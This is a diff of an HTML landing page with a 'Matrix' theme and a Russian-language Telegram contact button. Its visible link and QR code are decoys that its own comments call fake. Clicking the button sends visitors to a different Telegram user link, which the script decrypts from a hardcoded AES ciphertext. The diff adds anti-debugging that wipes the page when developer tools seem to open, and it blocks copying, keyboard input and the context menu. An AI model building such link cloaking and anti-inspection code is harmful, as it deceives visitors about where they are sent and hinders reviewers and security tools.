@@ -3,12 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <title>Matrix Access</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
-      padding: 0;
       background: black;
       color: #00ff00;
       font-family: monospace;
@@ -21,6 +19,10 @@
       left: 0;
       z-index: -1;
     }
+    h1 {
+      text-align: center;
+      margin-top: 40px;
+    }
     .btn {
       padding: 12px 24px;
       border: 2px solid #00ff00;
@@ -30,6 +32,7 @@
       text-decoration: none;
       cursor: pointer;
       margin-top: 20px;
+      display: inline-block;
     }
     .btn:hover {
       background: #00ff00;
@@ -43,47 +46,64 @@
       margin-top: 30px;
       color: red;
       font-size: 14px;
-      max-width: 90%;
       text-align: center;
+      max-width: 90%;
     }
   </style>
 </head>
-<body oncontextmenu="return false" onselectstart="return false" oncopy="return false" onkeydown="return false">
+<body 
+  oncontextmenu="return false"
+  onselectstart="return false"
+  oncopy="return false"
+  oncut="return false"
+  onpaste="return false"
+  onkeydown="return false"
+  ondragstart="return false">
 
   <canvas class="matrix"></canvas>
 
   <h1>ACCESS GRANTED<br>ROUTING: NODE_713</h1>
-
-  <!-- Кнопка с фейковой ссылкой -->
   <a id="contactBtn" class="btn" href="https://t.me/join-proxy">СВЯЗАТЬСЯ</a>
-
-  <!-- QR-код также на фейк -->
   <canvas id="qrcode"></canvas>
 
   <div class="warning">
-    На вашем устройстве обязательно должен быть установлен Telegram.<br>
-    Если кнопка не срабатывает — скопируй ссылку вручную или отсканируй QR-код.
+    Устройство должно иметь установленный Telegram.<br>
+    Если кнопка не работает — отсканируй QR-код.
   </div>
+
+  <noscript>
+    <div style="color: red; background: black; padding: 20px; text-align: center;">
+      JavaScript отключён. Пожалуйста, включите его для доступа.
+    </div>
+  </noscript>
 
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
   <script>
+    // 🧱 Анти-дебаг
+    setInterval(() => {
+      const threshold = 160;
+      if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+        document.body.innerHTML = "";
+      }
+    }, 500);
+
+    // ✅ Зашифрованная tg://user ссылка
     const encrypted = "Kx5V3Bt0eTzaBwbgGmlouzKsc5LvDbSef3xND/NzCT4=";
     const key = CryptoJS.MD5("MatrixSecretKey42");
-
     const decrypted = CryptoJS.AES.decrypt(encrypted, key, {
       iv: key,
       mode: CryptoJS.mode.CBC,
       padding: CryptoJS.pad.Pkcs7
     }).toString(CryptoJS.enc.Utf8);
 
-    // При клике — редирект на настоящую ссылку
+    // ⬅️ Кнопка: при клике - переход на расшифрованную ссылку
     document.getElementById("contactBtn").addEventListener("click", function(e) {
       e.preventDefault();
       window.location.href = decrypted;
     });
 
-    // QR-код с фейковой ссылкой
+    // 🧬 QR-код: ведёт якобы на proxy, но можно заменить на фрейм или редирект
     QRCode.toCanvas(document.getElementById("qrcode"), "https://t.me/join-proxy", {
       color: {
         dark: "#00ff00",
@@ -92,7 +112,7 @@
       width: 200
     });
 
-    // MATRIX-анимация
+    // 🌌 Matrix background
     const canvas = document.querySelector('.matrix');
     const ctx = canvas.getContext('2d');
     function resize() {
@@ -101,7 +121,6 @@
     }
     resize();
     window.addEventListener('resize', resize);
-
     const columns = Math.floor(canvas.width / 12);
     const drops = Array(columns).fill(1);
     function drawMatrix() {
